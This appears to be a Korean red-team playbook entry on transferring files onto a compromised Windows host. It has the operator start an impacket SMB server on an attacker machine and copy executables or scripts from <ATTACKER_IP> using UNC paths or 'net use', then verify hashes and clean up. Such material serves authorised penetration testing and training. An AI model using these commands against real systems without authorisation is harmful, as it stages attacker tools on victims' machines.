---
tags:
  - 환경/windows
  - 서비스/smb
시작조건: ["Windows 대상 셸 확보", "Windows 대상에서 공격 호스트의 SMB 445/TCP에 연결 가능"]
필요권한: ["Windows 대상의 저장 경로 쓰기 권한", "공격 호스트의 공유 디렉터리 읽기 권한"]
필요조건: ["반입할 파일", "공격 호스트 SMB 주소와 공유명", "Guest 차단 시 임시 SMB 사용자명과 비밀번호"]
결과: ["Windows 대상에 반입한 파일", "송신본과 수신본의 SHA-256 비교 결과"]
---

# SMB 공유로 Windows 파일 반입

## 한 줄 판단

Windows 대상 셸에서 공격 호스트의 SMB 445/TCP에 연결할 수 있고 대상 저장 경로에 쓸 수 있으면, 공격 호스트에 SMB 공유를 열고 UNC 경로 또는 인증된 드라이브에서 파일을 복사한 뒤 양쪽 SHA-256을 비교한다.

## 사용할 때

- Windows 대상에 실행 파일·스크립트·설정 파일을 반입해야 할 때.
- 대상에서 공격 호스트의 SMB 445/TCP로 연결할 수 있을 때.
- HTTP 클라이언트보다 Windows의 `copy`·`net use`를 바로 사용할 수 있을 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 통신 방향 | Windows 대상에서 공격 호스트의 445/TCP 도달 | `Test-NetConnection <ATTACKER_IP> -Port 445` | 주소, route와 방화벽 확인 |
| 송신 파일 | 공격 호스트 공유 디렉터리에 파일 존재 | `sha256sum <SOURCE_FILE>` | 공유 경로와 파일명 확인 |
| 대상 저장 경로 | 현재 Windows 계정으로 파일 생성 가능 | `<DESTINATION_DIRECTORY>`에 임시 파일 생성 | 디렉터리 ACL과 디스크 공간 확인 |
| SMB 인증 | Guest 접근 허용 또는 임시 공유 계정 사용 가능 | 첫 UNC 접근 결과 | Guest 차단이면 인증 공유로 전환 |

## 실행

### Linux 공격 호스트에서 SMB 공유 시작

Guest 접근을 먼저 확인할 때:

```bash
sudo impacket-smbserver share -smb2support <SHARE_DIRECTORY>
sha256sum <SHARE_DIRECTORY>/<SOURCE_FILE>
```

Guest 접근이 차단되면 사용자명과 비밀번호를 지정해 다시 시작한다.

```bash
sudo impacket-smbserver share -smb2support <SHARE_DIRECTORY> -user <SMB_USER> -password '<SMB_PASSWORD>'
```

### Windows 대상 호스트에서 복사

Guest 접근이 가능한 경우:

```cmd
copy \\<ATTACKER_IP>\share\<SOURCE_FILE> <DESTINATION_FILE>
certutil -hashfile <DESTINATION_FILE> SHA256
```

`You can't access this shared folder because ... block unauthenticated guest access`가 나오면 같은 명령을 반복하지 않고 인증 공유를 연결한다.

```cmd
net use N: \\<ATTACKER_IP>\share /user:<SMB_USER> <SMB_PASSWORD>
copy N:\<SOURCE_FILE> <DESTINATION_FILE>
certutil -hashfile <DESTINATION_FILE> SHA256
net use N: /delete
```

확인할 출력:

- `The command completed successfully`는 SMB 드라이브 연결 성공이다.
- `1 file(s) copied.`와 실제 `<DESTINATION_FILE>` 생성을 함께 확인한다.
- 공격 호스트의 원본과 Windows 대상의 SHA-256이 같아야 반입 완료다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| SMB 연결, 파일 생성과 SHA-256 일치 | 파일 반입 완료 | Windows 대상의 반입 파일 | 파일 실행 조건과 현재 권한을 별도 확인 |
| Guest 정책 차단 메시지 | 익명 SMB 공유 사용 불가 | SMB 경로는 도달하지만 인증 필요 | 임시 인증 공유와 `net use` 사용 |
| `System error 53` 또는 연결 실패 | SMB 경로·주소·공유명 문제 | 파일 미반입 | 445/TCP, 공격 호스트 listener와 공유명 확인 |
| `Access is denied` 또는 대상 쓰기 실패 | 공유 읽기 또는 대상 디렉터리 쓰기 권한 부족 | 파일 미반입 | 오류가 난 경로의 ACL과 현재 계정 확인 |
| 복사됐지만 SHA-256 불일치 | 파일 손상 또는 다른 파일 복사 | 손상된 반입 파일 | 실행하지 말고 경로와 원본을 확인해 재전송 |

## 확인할 출력과 권한

- SMB 드라이브 연결, 파일 복사와 무결성 확인은 서로 다른 완료 단계다.
- 파일 반입은 실행 성공이나 권한 상승을 뜻하지 않는다.

## 변경 영향과 복구

```cmd
del <DESTINATION_FILE>
if exist <DESTINATION_FILE> echo FILE_STILL_EXISTS
net use N: /delete
```

- 이번 절차에서 만든 대상 파일과 드라이브 매핑만 제거한다.
- 공격 호스트의 임시 SMB 서버를 종료하고 임시 사용자명·비밀번호를 재사용하지 않는다.

## 관련 도구

- [[impacket-smbserver]]

## 관련 상태 라우터

- [[상황별 파일 전송]]
